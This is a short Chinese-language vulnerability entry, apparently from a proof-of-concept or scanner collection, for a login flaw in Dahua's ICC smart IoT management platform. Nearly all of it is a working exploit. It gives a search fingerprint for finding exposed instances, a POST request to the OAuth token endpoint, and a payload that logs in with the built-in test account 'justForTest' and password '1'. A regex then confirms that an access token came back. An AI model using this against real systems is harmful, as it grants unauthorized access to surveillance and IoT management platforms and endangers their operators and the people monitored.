# 大华智能物联综合管理平台ICCjustForTest用户登录漏洞

大华 ｜ 其他 ｜ —
- **指纹**：`body="*客户端会小于800*"`
- **请求**：`POST /evo-apigw/evo-oauth/oauth/token HTTP/1.1`

**Payload**
```
username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key=
```
- **响应特征**：200 ^(?=.*?success)(?=.*?access_token).*?$